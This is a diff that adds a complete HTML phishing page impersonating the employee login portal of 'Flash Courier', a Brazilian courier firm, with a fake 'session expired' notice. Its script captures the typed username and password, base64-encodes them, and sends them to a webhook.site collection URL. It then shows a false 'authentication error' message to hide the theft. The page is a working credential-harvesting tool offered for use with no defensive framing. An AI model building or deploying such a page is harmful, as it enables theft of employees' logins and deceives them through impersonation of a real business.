@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Flash Courier - Portal do Funcionário</title>
+    <style>
+        body { font-family: Arial, sans-serif; background: #f0f0f0; margin: 0; padding: 0; }
+        .header { background: #102d69; color: white; padding: 15px; text-align: center; }
+        .container { max-width: 400px; margin: 50px auto; background: white; padding: 30px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
+        .logo { font-size: 24px; font-weight: bold; color: #102d69; margin-bottom: 20px; text-align: center; }
+        input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box; }
+        button { width: 100%; padding: 12px; background: #102d69; color: white; border: none; border-radius: 4px; cursor: pointer; font-size: 16px; }
+        button:hover { background: #1a4a8c; }
+        .notice { background: #fff3cd; border-left: 4px solid #ffc107; padding: 12px; margin-bottom: 15px; font-size: 13px; }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <h2>FLASH COURIER</h2>
+        <p>Portal do Funcionário</p>
+    </div>
+    <div class="container">
+        <div class="logo">LOGIN</div>
+        <div class="notice">
+            Sessão expirada. Faça login novamente para continuar.
+        </div>
+        <form id="loginForm">
+            <input type="text" id="user" placeholder="Usuário" required>
+            <input type="password" id="pass" placeholder="Senha" required>
+            <button type="submit">Entrar</button>
+        </form>
+    </div>
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            var u = document.getElementById('user').value;
+            var p = document.getElementById('pass').value;
+            fetch('https://webhook.site/REPLACE-UUID?u=' + btoa(u) + '&p=' + btoa(p))
+                .then(() => alert('Erro de autenticação. Tente novamente.'));
+        });
+    </script>
+</body>
+</html>
